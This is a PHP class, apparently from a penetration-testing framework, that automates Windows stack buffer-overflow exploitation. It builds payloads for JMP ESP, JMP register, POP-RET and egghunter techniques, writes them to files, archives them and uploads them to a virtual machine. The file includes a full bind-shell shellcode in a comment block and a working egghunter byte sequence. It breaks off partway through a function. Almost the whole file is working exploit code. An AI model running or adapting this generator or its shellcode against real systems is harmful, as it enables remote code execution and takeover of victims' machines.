<?php

class ret2stack4win extends bin4win{


	public function __construct($bin_bof) {
		parent::__construct($bin_bof);
	}
	

	public function ret2stack4win($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file){
			$this->chapitre("STACK WINDOWS JMP ESP ALL");
		// OK
		$this->ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // pause();
		// OK
		$this->ret2stack4win4jmp2esp4sc_after_egghunter($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // pause();
		// OK
		$this->ret2stack4win4jmp2esp4sc_before_egghunter($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // pause();
		// OK
		$this->ret2stack4win4jmp2esp4sc_before_jmpback($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // pause();
		foreach($this->all_reg_32 as $reg) {
			// NOT YET
			//$this->ret2stack4win4jmp2esp4sc_before_jmp_reg($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // pause();
		}
		
		
		
		
			$this->chapitre("WINDOWS JMP REG ALL");
		foreach($this->all_reg_32 as $reg) {
			$this->ret2stack4win4jmp2reg($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file);
			$this->ret2stack4win4jmp2reg4add($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file);
			$this->ret2stack4win4jmp2reg4sub($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file);
			$this->ret2stack4win4jmp2reg4offset($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file);
			$this->ret2stack4win4jmp2reg4short_jmp($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file);
			// OK
			$this->ret2stack4win4jmp2reg4pop1ret($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // //pause();
			// OK
			$this->ret2stack4win4jmp2reg4pop2ret($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // //pause();
			// Aucune
			$this->ret2stack4win4jmp2reg4pop3ret($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // //pause();
			// Aucune
			$this->ret2stack4win4jmp2reg4pop8ret($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // //pause();
		}
		
	
	
	
		$this->ret2stack4win4pop1ret($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // pause();
		$this->ret2stack4win4pop2ret($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // pause();
		$this->ret2stack4win4pop3ret($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // pause();
		$this->ret2stack4win4pop8ret($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file); // pause();
	}
	
	


	######################### WINDOWS ###############################################################
	
	/*
	 * // OK
	 *
	 * # MSF windows/shell_bind_tcp LPORT=4444
	 * $shellcode =
	 * "\xda\xc5\xd9\x74\x24\xf4\x2b\xc9\xba\x3a\x04\xcc\xb6\x5e".
	 * "\xb1\x56\x31\x56\x19\x83\xee\xfc\x03\x56\x15\xd8\xf1\x30".
	 * "\x5e\x95\xfa\xc8\x9f\xc5\x73\x2d\xae\xd7\xe0\x25\x83\xe7".
	 * "\x63\x6b\x28\x8c\x26\x98\xbb\xe0\xee\xaf\x0c\x4e\xc9\x9e".
	 * "\x8d\x7f\xd5\x4d\x4d\x1e\xa9\x8f\x82\xc0\x90\x5f\xd7\x01".
	 * "\xd4\x82\x18\x53\x8d\xc9\x8b\x43\xba\x8c\x17\x62\x6c\x9b".
	 * "\x28\x1c\x09\x5c\xdc\x96\x10\x8d\x4d\xad\x5b\x35\xe5\xe9".
	 * "\x7b\x44\x2a\xea\x40\x0f\x47\xd8\x33\x8e\x81\x11\xbb\xa0".
	 * "\xed\xfd\x82\x0c\xe0\xfc\xc3\xab\x1b\x8b\x3f\xc8\xa6\x8b".
	 * "\xfb\xb2\x7c\x1e\x1e\x14\xf6\xb8\xfa\xa4\xdb\x5e\x88\xab".
	 * "\x90\x15\xd6\xaf\x27\xfa\x6c\xcb\xac\xfd\xa2\x5d\xf6\xd9".
	 * "\x66\x05\xac\x40\x3e\xe3\x03\x7d\x20\x4b\xfb\xdb\x2a\x7e".
	 * "\xe8\x5d\x71\x17\xdd\x53\x8a\xe7\x49\xe4\xf9\xd5\xd6\x5e".
	 * "\x96\x55\x9e\x78\x61\x99\xb5\x3c\xfd\x64\x36\x3c\xd7\xa2".
	 * "\x62\x6c\x4f\x02\x0b\xe7\x8f\xab\xde\xa7\xdf\x03\xb1\x07".
	 * "\xb0\xe3\x61\xef\xda\xeb\x5e\x0f\xe5\x21\xe9\x08\x2b\x11".
	 * "\xb9\xfe\x4e\xa5\x2f\xa2\xc7\x43\x25\x4a\x8e\xdc\xd2\xa8".
	 * "\xf5\xd4\x45\xd3\xdf\x48\xdd\x43\x57\x87\xd9\x6c\x68\x8d".
	 * "\x49\xc1\xc0\x46\x1a\x09\xd5\x77\x1d\x04\x7d\xf1\x25\xce".
	 * "\xf7\x6f\xe7\x6f\x07\xba\x9f\x0c\x9a\x21\x60\x5b\x87\xfd".
	 * "\x37\x0c\x79\xf4\xd2\xa0\x20\xae\xc0\x39\xb4\x89\x41\xe5".
	 * "\x05\x17\x4b\x68\x31\x33\x5b\xb4\xba\x7f\x0f\x68\xed\x29".
	 * "\xf9\xce\x47\x98\x53\x98\x34\x72\x34\x5d\x77\x45\x42\x62".
	 * "\x52\x33\xaa\xd2\x0b\x02\xd4\xda\xdb\x82\xad\x07\x7c\x6c".
	 * "\x64\x8c\x8c\x27\x25\xa4\x04\xee\xbf\xf5\x48\x11\x6a\x39".
	 * "\x75\x92\x9f\xc1\x82\x8a\xd5\xc4\xcf\x0c\x05\xb4\x40\xf9".
	 * "\x29\x6b\x60\x28\x23";
	 *
	 *
	 */
	
	
	
	
	
	
	function ret2stack4win4pop1ret($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
		$this->chapitre("EIP POP RET TO  SHELLCODE");
		$nop = "\\x90";
		$junk = "\\x41";
		$vm_machine = new vm($vmx);
	
		$this->ssTitre("SHELLCODE SIZE");
		$size_shellcode = $this->hex2size($shellcode);
		$this->ssTitre("HEADER SIZE");
		$header_size = $this->hex2size($header);
		$this->ssTitre("FOOTER SIZE");
		$footer_size = $this->hex2size($footer);
	
		$offset_eip = $offset_eip + $header_size;
		$header = "\"$junk\"*($offset_eip-$header_size)";
		$junk_repeat = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size + 4);
		// $footer = "\"BBBB\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"" ;
		$footer = "\"$nop$nop$nop$nop\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
		$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POP RET\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
	
		$tab_pop = win_get_pop1ret($vmx, $login, $password, $this->file_path, $dll);
		$total_pop = count($tab_pop);
		for($j = 0; $j < $total_pop; $j ++) {
			$pop_addr = trim($tab_pop [$j]);
			$addr_pop = $this->hex2rev_32($pop_addr);
			$this->article("$j/$total_pop - POP RET", $pop_addr);
			$cmd = "python -c 'print $header+\"$addr_pop\"+$footer'";
			$query = "$cmd | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_eip_pop1ret_*" . ".$ext_file";
			// payload_check_norme("$shellcode$addr_reg");
			$this->requette($query);
			// $this->bin2debug4payload($cmd);
			// //pause();
		}
		// pause();
		$this->ssTitre("Compressing and Uploading Exploits");
		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_eip_pop1ret.tar";
		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_eip_pop1ret_*" . ".$ext_file ");
	
		$file = "$rep_path/$exploit_archive";
		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
		$vm_machine->vm2upload($file, $dest);
	}
	
	
	function ret2stack4win4pop2ret($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
		$this->chapitre("EIP POP POP RET TO  SHELLCODE");
		$nop = "\\x90";
		$junk = "\\x41";
		$vm_machine = new vm($vmx);
	
		$this->ssTitre("SHELLCODE SIZE");
		$size_shellcode = $this->hex2size($shellcode);
		$this->ssTitre("HEADER SIZE");
		$header_size = $this->hex2size($header);
		$this->ssTitre("FOOTER SIZE");
		$footer_size = $this->hex2size($footer);
	
		$offset_eip = $offset_eip + $header_size;
		$header = "\"$nop\"*($offset_eip-$header_size)";
		$junk_repeat = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size + 8);
		// $footer = "\"BBBB\"+\"CCCC\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"" ;
		$footer = "\"$nop$nop$nop$nop\"+\"$nop$nop$nop$nop\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
		$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POP RET\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
	
		$tab_pop = win_get_pop2ret($vmx, $login, $password, $this->file_path, $dll);
		$total_pop = count($tab_pop);
		for($j = 0; $j < $total_pop; $j ++) {
			$pop_addr = trim($tab_pop [$j]);
			$addr_pop = $this->hex2rev_32($pop_addr);
			$this->article("$j/$total_pop - POP POP RET", $pop_addr);
			$cmd = "python -c 'print $header+\"$addr_pop\"+$footer'";
			$query = "$cmd | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_eip_pop2ret_*" . ".$ext_file";
			// payload_check_norme("$shellcode$addr_reg");
			$this->requette($query);
			// $this->bin2debug4payload($cmd);
			// //pause();
		}
		// pause();
		$this->ssTitre("Compressing and Uploading Exploits");
		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_eip_pop2ret.tar";
		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_eip_pop2ret_*" . ".$ext_file ");
	
		$file = "$rep_path/$exploit_archive";
		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
		$vm_machine->vm2upload($file, $dest);
	}
	function ret2stack4win4pop3ret($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
		$this->chapitre("EIP POP POP POP RET TO SHELLCODE");
		$nop = "\\x90";
		$junk = "\\x41";
		$vm_machine = new vm($vmx);
	
		$this->ssTitre("SHELLCODE SIZE");
		$size_shellcode = $this->hex2size($shellcode);
		$this->ssTitre("HEADER SIZE");
		$header_size = $this->hex2size($header);
		$this->ssTitre("FOOTER SIZE");
		$footer_size = $this->hex2size($footer);
	
		$offset_eip = $offset_eip + $header_size;
		$header = "\"$nop\"*($offset_eip-$header_size)";
		$junk_repeat = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size + 12);
		// $footer = "\"BBBB\"+\"CCCC\"+\"DDDD\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"" ;
		$footer = "\"$nop$nop$nop$nop\"+\"$nop$nop$nop$nop\"+\"$nop$nop$nop$nop\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
		$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POP RET\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
	
		$tab_pop = win_get_pop3ret($vmx, $login, $password, $this->file_path, $dll);
		$total_pop = count($tab_pop);
		for($j = 0; $j < $total_pop; $j ++) {
			$pop_addr = trim($tab_pop [$j]);
			$addr_pop = $this->hex2rev_32($pop_addr);
			$this->article("$j/$total_pop - POP POP POP RET", $pop_addr);
			$cmd = "python -c 'print $header+\"$addr_pop\"+$footer'";
			$query = "$cmd | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_eip_pop3ret_*" . ".$ext_file";
			// payload_check_norme("$shellcode$addr_reg");
			$this->requette($query);
			// $this->bin2debug4payload($cmd);
			// //pause();
		}
		// pause();
		$this->ssTitre("Compressing and Uploading Exploits");
		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_eip_pop3ret.tar";
		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_eip_pop3ret_*" . ".$ext_file ");
	
		$file = "$rep_path/$exploit_archive";
		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
		$vm_machine->vm2upload($file, $dest);
	}
	function ret2stack4win4pop8ret($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
		$this->chapitre("EIP POPAD RET TO SHELLCODE");
		$nop = "\\x90";
		$junk = "\\x41";
		$vm_machine = new vm($vmx);
	
		$this->ssTitre("SHELLCODE SIZE");
		$size_shellcode = $this->hex2size($shellcode);
		$this->ssTitre("HEADER SIZE");
		$header_size = $this->hex2size($header);
		$this->ssTitre("FOOTER SIZE");
		$footer_size = $this->hex2size($footer);
	
		$offset_eip = $offset_eip + $header_size;
		$header = "\"$nop\"*($offset_eip-$header_size)";
		$junk_repeat = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size + 32);
		// $footer = "\"BBBB\"+\"CCCC\"+\"DDDD\"+\"EEEE\"+\"FFFF\"+\"GGGG\"+\"HHHH\"+\"IIII\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"" ;
		$footer = "\"$nop$nop$nop$nop\"+\"$nop$nop$nop$nop\"+\"$nop$nop$nop$nop\"+\"$nop$nop$nop$nop\"+\"$nop$nop$nop$nop\"+\"$nop$nop$nop$nop\"+\"$nop$nop$nop$nop\"+\"$nop$nop$nop$nop\"+\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
		$this->article("template", "python -c 'print \"+\"JUNK\"*(\"OFFSET EIP=$offset_eip)+\"EIP = POP RET\"+\"\\x90\"*$junk_repeat+\"SHELLCODE\"+\"FOOTER\"'");
	
		$tab_pop = win_get_pop8ret($vmx, $login, $password, $this->file_path, $dll);
		$total_pop = count($tab_pop);
		for($j = 0; $j < $total_pop; $j ++) {
			$pop_addr = trim($tab_pop [$j]);
			$addr_pop = $this->hex2rev_32($pop_addr);
			$this->article("$j/$total_pop - POPAD RET", $pop_addr);
			$cmd = "python -c 'print $header+\"$addr_pop\"+$footer'";
			$query = "$cmd | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_eip_pop8ret_*" . ".$ext_file";
			// payload_check_norme("$shellcode$addr_reg");
			$this->requette($query);
			// $this->bin2debug4payload($cmd);
			// //pause();
		}
		// pause();
		$this->ssTitre("Compressing and Uploading Exploits");
		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_eip_pop8ret.tar";
		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_eip_pop8ret_*" . ".$ext_file ");
	
		$file = "$rep_path/$exploit_archive";
		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
		$vm_machine->vm2upload($file, $dest);
	}
	
	function ret2stack4win4jmp2esp4sc_before_egghunter($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
		$nop = "\\x90";
		$junk = "\\x41";
		$vmx_name = trim(basename($vmx));
		$vmx_name = str_replace(".vmx", "", $vmx_name);
		$vmem_name = trim(basename($this->file_path));
	
		$this->chapitre("JMP ESP SC before egghunter");
		$vm_machine = new vm($vmx);
	
	
		$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"EGG\")-len(\"SHELLCODE\"))+\"EGG\"+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"EGG HUNTER\")-8)+\"EGG HUNTER\"'");
		$this->ssTitre("SHELLCODE SIZE");
		$shellcode_size = $this->hex2size($shellcode);
		// egghunter marker w00t
		$egghunter = '\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7';
		$this->ssTitre("EGG HUNTER SIZE");
		$egghunter_size = $this->hex2size($egghunter);
		$egg = "w00tw00t";
		$this->ssTitre("HEADER SIZE");
		$header_size = $this->hex2size($header);
		$this->ssTitre("FOOTER SIZE");
		$footer_size = $this->hex2size($footer);
	
		$offset_eip = $offset_eip + $header_size;
	
		$nop_repeat = $exploit_size_max - $offset_eip - 4 - $egghunter_size - $footer_size;
		$this->article("NOPs AFTER EIP", $nop_repeat);
		// pause();
		$header = "\"$header\"+\"$junk\"*($offset_eip-$header_size-8-$shellcode_size)+\"$egg\"+\"$shellcode\"";
		$footer = "\"$nop\"*$nop_repeat+\"$egghunter\"+\"$footer\"";
	
		$JMPs_ESP = $vm_machine->vm4jmp2reg($rep_path,"esp", $vmx, $this->file_path, $dll);
		$i = 1;
		$total_esp = count($JMPs_ESP);
		foreach($JMPs_ESP as $addr_jmp_esp_sc_before_egghunter) {
			$addr_jmp_esp_sc_before_egghunter = trim($addr_jmp_esp_sc_before_egghunter);
			if(! empty($addr_jmp_esp_sc_before_egghunter)) {
				$this->article("$i/$total_esp: JMP ESP", $addr_jmp_esp_sc_before_egghunter);
				$jmp_esp_sc_before_egghunter = $this->hex2rev_32($addr_jmp_esp_sc_before_egghunter);
				$payload = "$header+\"$jmp_esp_sc_before_egghunter\"+$footer";
				// $payload = addcslashes($payload,'\\$');
				$query_jmp_esp_sc_before_egghunter = "python -c 'print $payload' | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_egghunter_" . "$addr_jmp_esp_sc_before_egghunter" . "." . "$ext_file";
				$this->requette($query_jmp_esp_sc_before_egghunter);
			}
			$i ++;
		}
		// pause();
		$this->ssTitre("Compressing and Uploading Exploits");
		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_egghunter.tar";
		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_egghunter_*" . ".$ext_file ");
	
		$file = "$rep_path/$exploit_archive";
		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
		$vm_machine->vm2upload($file, $dest);
	}
	function ret2stack4win4jmp2esp4sc_after_egghunter($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
	
		$vmx_name = trim(basename($vmx));
		$vmx_name = str_replace(".vmx", "", $vmx_name);
		$vmem_name = trim(basename($this->file_path));
	
		$nop = "\\x90";
		$vm_machine = new vm($vmx);
	
	
		$this->chapitre("JMP ESP SC AFTER egghunter");
		$this->article("template", "python -c 'print \"ANYTHING\"*\"OFFSET EIP\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"SHELLCODE\")-len(\"EGG HUNTER\")-len(\"EGG\"))/2+\"EGG HUNTER\"+\"ANYTHING\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"SHELLCODE\")-len(\"EGG HUNTER\")-len(\"EGG\"))/2+\"EGG\"+\"SHELLCODE\"'");
		$shellcode_size = $this->hex2size($shellcode);
		// egghunter marker w00t
		$egghunter = '\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7';
		$egghunter_size = $this->hex2size($egghunter);
		$egghunter_asm = $this->hex2asm($egghunter);
		$egg = "w00tw00t";
		$header_size = $this->hex2size($header);
		$footer_size = $this->hex2size($footer);
		$offset_eip = $offset_eip + $header_size;
		$nop_repeat = intval(($exploit_size_max - $offset_eip - 4 - $egghunter_size - 8 - $shellcode_size - $footer_size) / 2);
		$header = "\"$header\"+\"\\x41\"*($offset_eip-$header_size)";
		$footer = "\"$nop\"*$nop_repeat+\"$egghunter\"+\"$nop\"*$nop_repeat+\"$egg\"+\"$shellcode\"+\"$footer\"";
	
		$JMPs_ESP = $vm_machine->vm4jmp2reg($rep_path,"esp", $vmx, $this->file_path, $dll);
		$i = 1;
		$total_esp = count($JMPs_ESP);
	
		foreach($JMPs_ESP as $addr_jmp_esp_sc_after_egghunter) {
			$addr_jmp_esp_sc_after_egghunter = trim($addr_jmp_esp_sc_after_egghunter);
			if(! empty($addr_jmp_esp_sc_after_egghunter)) {
				$this->article("$i/$total_esp : JMP ESP", $addr_jmp_esp_sc_after_egghunter);
				$jmp_esp_sc_after_egghunter = $this->hex2rev_32($addr_jmp_esp_sc_after_egghunter);
				$payload = "$header+\"$jmp_esp_sc_after_egghunter\"+$footer";
				// $payload = addcslashes($payload,'\\$');
				$query_jmp_esp_sc_after_egghunter = "python -c 'print $payload' | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_after_egghunter_" . "$addr_jmp_esp_sc_after_egghunter" . "." . "$ext_file";
				$this->requette($query_jmp_esp_sc_after_egghunter);
			}
			$i ++;
		}
		// pause();
		$this->ssTitre("Compressing and Uploading Exploits");
		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_after_egghunter.tar";
		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_after_egghunter_*" . ".$ext_file ");
	
		$file = "$rep_path/$exploit_archive";
		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
		$vm_machine->vm2upload($file, $dest);
	}
	function ret2stack4win4jmp2esp4sc_after_only($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
		
	
		$vm_machine = new vm("xp3");
	
		$dll = strtolower(trim($dll));
		$nop = "\\x90";
		$this->chapitre("JMP ESP SC AFTER ONLY");
		$this->article("template", "python -c 'print \"HEADER\"+\"ANYTHING\"*\"OFFSET EIP\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"SHELLCODE\")-len(\"FOOTER\"))+\"SHELLCODE\"+\"FOOTER\"'");
		$shellcode_size = $this->hex2size($shellcode);
		$header_size = $this->hex2size($header);
		$footer_size = $this->hex2size($footer);
		$offset_eip = $offset_eip + $header_size;
		$junk_repeat = $offset_eip - $header_size;
		$header = "\"$header\"+\"\\x41\"*$junk_repeat";
		$nop_repeat = $exploit_size_max - $offset_eip - 4 - $shellcode_size - $footer_size;
		$footer = "\"$nop\"*$nop_repeat+\"$shellcode\"+\"$footer\"";
	
		$JMPs_ESP = $vm_machine->vm4jmp2reg($rep_path,"esp", $vmx, $this->file_path, $dll);
		$i = 1;
		$total_esp = count($JMPs_ESP);
		foreach($JMPs_ESP as $addr_jmp_esp_sc_after_only) {
			$addr_jmp_esp_sc_after_only = trim($addr_jmp_esp_sc_after_only);
			if(! empty($addr_jmp_esp_sc_after_only)) {
				$this->article("$i/$total_esp: JMP ESP", $addr_jmp_esp_sc_after_only);
				$this->article("HEADER SIZE", $header_size);
				$this->article("FOOTER SIZE", $footer_size);
				$this->article("NOP N°", $nop_repeat);
				$jmp_esp_sc_after_only = $this->hex2rev_32($addr_jmp_esp_sc_after_only);
				$payload = "$header+\"$jmp_esp_sc_after_only\"+$footer";
				// $payload = addcslashes($payload,'\\$');
				$query_jmp_esp_sc_after_only = "python -c 'print $payload' | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_after_only_" . "$addr_jmp_esp_sc_after_only" . "." . "$ext_file";
				$this->requette($query_jmp_esp_sc_after_only);
			}
			$i ++;
		}
		// pause();
		$this->ssTitre("Compressing and Uploading Exploits");
		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_after_only.tar";
		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_after_only_*" . ".$ext_file ");
	
	
		$file = "$rep_path/$exploit_archive";
		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
		$vm_machine->vm2upload($file, $dest);
	}

	function ret2stack4win4jmp2reg($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
		$this->chapitre("JMP $reg SC BEFORE ONLY");
	
		$nop = "\\x90";
		$junk = "\\x41";
		$vm_machine = new vm($vmx);
	
		$vmx_name = trim(basename($vmx));
		$vmx_name = str_replace(".vmx", "", $vmx_name);
		$vmem_name = trim(basename($this->file_path));
	
		$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP\"-len(\"SHELLCODE\")+\"SHELLCODE\"+\"JMP $reg\"+\"FOOTER\"'");
		$shellcode_size = $this->hex2size($shellcode);
		$header_size = $this->hex2size($header);
		$footer_size = $this->hex2size($footer);
		$offset_eip = $offset_eip + $header_size;
		$offset_nop = $offset_eip - $shellcode_size - $header_size;
		$header = "\"$nop\"*$offset_nop+\"$shellcode\"";
		$footer = "\"$junk\"*($exploit_size_max-$offset_eip-4-$footer_size)";
	
		$JMPs_reg = $vm_machine->vm4jmp2reg($rep_path,$reg,$vmx, $this->file_path, $dll);
		$i = 1;
		$total_reg = count($JMPs_reg);
		foreach($JMPs_reg as $addr_jmp_reg_sc_before_only) {
			$addr_jmp_reg_sc_before_only = trim($addr_jmp_reg_sc_before_only);
			if(! empty($addr_jmp_reg_sc_before_only)) {
				$this->article("$i/$total_reg: JMP $reg", $addr_jmp_reg_sc_before_only);
				$jmp_reg_sc_before_only = $this->hex2rev_32($addr_jmp_reg_sc_before_only);
				$payload = "$header+\"$jmp_reg_sc_before_only\"+$footer";
				// $payload = addcslashes($payload,'\\$');
				$query_jmp_reg_sc_before_only = "python -c 'print $payload'  | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_sc_before_only_" . "$addr_jmp_reg_sc_before_only" . "." . "$ext_file";
				$this->requette($query_jmp_reg_sc_before_only);
			}
			$i ++;
		}
		// pause();
		$this->ssTitre("Compressing and Uploading Exploits");
		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_sc_before_only.tar";
		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_sc_before_only_*" . ".$ext_file ");
	
		$file = "$rep_path/$exploit_archive";
		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
		$vm_machine->vm2upload($file, $dest);
	}
	function ret2stack4win4jmp2reg4add($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
		$this->chapitre("ADD TO REGISTER $reg and JUMP");
		$vmx_name = trim(basename($vmx));
		$vmx_name = str_replace(".vmx", "", $vmx_name);
		$vmem_name = trim(basename($this->file_path));
		$nop = "\\x90";
		$junk = "\\x41";
		$vm_machine = new vm($vmx);
	
		$this->ssTitre("SHELLCODE SIZE");
		$size_shellcode = $this->hex2size($shellcode);
		$this->ssTitre("HEADER SIZE");
		$header_size = $this->hex2size($header);
		$this->ssTitre("FOOTER SIZE");
		$footer_size = $this->hex2size($footer);
	
		$offset_eip = $offset_eip + $header_size;
		$nop_repeat_tmp = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size);
		$jmp_int =(int)(($offset_eip +($nop_repeat_tmp / 2)) / 100);
		$opcode_hex = $this->asm2hex("add $reg, 100");
		$opcode_jmp_reg = $this->asm2hex("jmp $reg");
		$this->article("OPCODE ADD", $opcode_hex);
		$this->article("OPCODE JMP $reg", $opcode_jmp_reg);
		$this->article("NOMBRE DE SAUT", $jmp_int);
		// pause();
		$header = "\"$opcode_hex\"*$jmp_int+\"$opcode_jmp_reg\"+\"$nop\"*($offset_eip-$header_size-(3*$jmp_int)-2)";
	
		$nop_repeat = $exploit_size_max -($offset_eip + 4 + $size_shellcode + $footer_size);
		$footer = "\"$nop\"*$nop_repeat+\"$shellcode\"+\"$footer\"";
	
		$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHORT JMP\"))+\"SHORT JMP\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	
		$tab_reg = $vm_machine->vm4jmp2reg($rep_path,$reg, $this->file_path, $dll);
		$total_reg = count($tab_reg);
		for($i = 0; $i < $total_reg; $i ++) {
			$reg_addr = trim($tab_reg [$i]);
			$addr_reg = $this->hex2rev_32($reg_addr);
			$this->article("$i/$total_reg - $reg", $reg_addr);
